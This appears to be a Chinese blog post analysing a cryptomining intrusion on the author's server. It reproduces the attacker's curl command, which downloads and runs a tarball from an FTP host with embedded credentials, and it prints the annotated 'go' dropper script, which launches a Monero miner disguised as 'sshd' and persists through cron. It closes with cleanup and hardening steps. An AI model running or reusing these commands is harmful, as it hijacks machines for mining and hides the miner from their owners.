---
title: '入侵脚本分析 - 瞒天过海'
date: '2019-12-23 18:54:01'
draft: false
---

机器被入侵了，写点东西，分析一下入侵脚本，顺便也学习一下。

```bash
bash -c curl -O ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz;tar xvf sshd.tgz;rm -rf sshd.tgz;cd .ssd;chmod +x *;./go -r
```

# 下载恶意软件

恶意软件的是使用 ftp 下载的， 地址是：ftp://noji:noji2012@153.122.137.67/.kde/sshd.tgz，这个 153.122.137.67 IP 是位于日本东京，ssd.taz 是一个 tar 包，用 tar 解压之后，出现一个 sh 文件，两个可执行文件。

```bash
-rwxr-xr-x 1 1001 1001  907 Nov 20 20:58 go # shell
-rwxrwxr-x 1 1001 1001 1.3M Nov 20 21:06 i686 # 可执行
-rwxrwxr-x 1 1001 1001 1.1M Nov 20 21:06 x86_64 # 可执行
```

# 分析可执行文件 go

go 是一个 shell 程序，下文是分析

```bash
#!/bin/bash

# pool.supportxmr.com门罗币的矿池
# 所以大家应该清楚了，入侵的机器应该用来挖矿的
# 这一步是测试本机与矿池dns是否通
if [ $(ping -c 1 pool.supportxmr.com 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];   then
        dns="" # dns通
else
        dns="-d" # dns不通
fi

# 删除用户计划任务，并将报错信息清除
crontab -r 2>/dev/null

# 这一步不太懂
rm -rf /tmp/.lock 2>/dev/null

# 设置当前进程的名字，为了掩人耳目，起个sshd, 鱼目混珠
EXEC="sshd"

# 获取当前目录
DIR=`pwd`

# 获取参数个数
# 这个程序传了一个 -r 参数，所以$#的值是1
if [ "$#" == "0" ];	then
	ARGS=""
else
	# 遍历每一个参数
	for var in "$@"
	do
		if [ "$var" != "-f" ];	then
			ARGS="$ARGS $var" # $var不是-f, 所以ARGS被这是为-r
		fi
		if [ ! -z "$FAKEPROC" ];	then
			FAKEPROC=$((FAKEPROC+1)) # 这里不会执行，因为$FAKEPROC是空字符串
		fi
		if [ "$var" == "-h" ];	then
			FAKEPROC="1" # 这里也不会执行
		fi
		if [[ "$FAKEPROC" == "2" ]];	then
			EXEC="$var" # 这里也不会执行
		fi
		if [ ! -z "$dns" ];	then
			ARGS="$ARGS $dns" # 如果本机与矿池dns通，则这里不会执行
		fi
	done
fi

# 创建目录
mkdir -- ".$EXEC" #创建 .sshd目录
cp -f -- `uname -m` ".$EXEC"/"$EXEC" # uname -m获取系统架构，然后判断要把i686还是x86_64拷贝到.sshd目录, 并重命名为sshd
./".$EXEC"/"$EXEC" $ARGS -f -c # 执行改名后的文件
rm -rf ".$EXEC"

# 生成后续执行的脚本
echo "#!/bin/bash
cd -- $DIR
mkdir -- .$EXEC
cp -f -- `uname -m` .$EXEC/$EXEC
./.$EXEC/$EXEC $ARGS -c
rm -rf .$EXEC" > "$EXEC"
chmod +x -- "$EXEC"
# 执行脚本
./"$EXEC"

# 生成计划任务执行脚本
(echo "* * * * * `pwd`/$EXEC") | sort - | uniq - | crontab -

# 删除go脚本
rm -rf go
```

上文的脚本中，有许多命令后跟着 `--`  和 `-`  这两个参数都是 bash 脚本的内置参数，用来标记命令的内置参数已经结束。

由于 x86_64 和 i686 是可执行文件，就不分析了。

# 恶意文件清除

1. 清除 crontab 定时任务
2. 清除可执行文件。可以 ll /proc/pid/exe  , 看下恶意进程的可执行文件位置
3. kill 恶意程序的进程
4. 修改 root 密码

# 如何防护

-   使用强密码，至少 32 位
-   使用 ssh key 登录
-   有些脚本会把名字伪装成系统服务，所以不要被进程的名字迷惑，而应该看看这个进程使用的资源是否合理。一个 sshd 的进程，正常来说占用 cpu 和内存不会超过 1%。如果你发现一个占用 CPU%的 sshd 进程，你就要小心这东西是不是滥竽充数了。

#
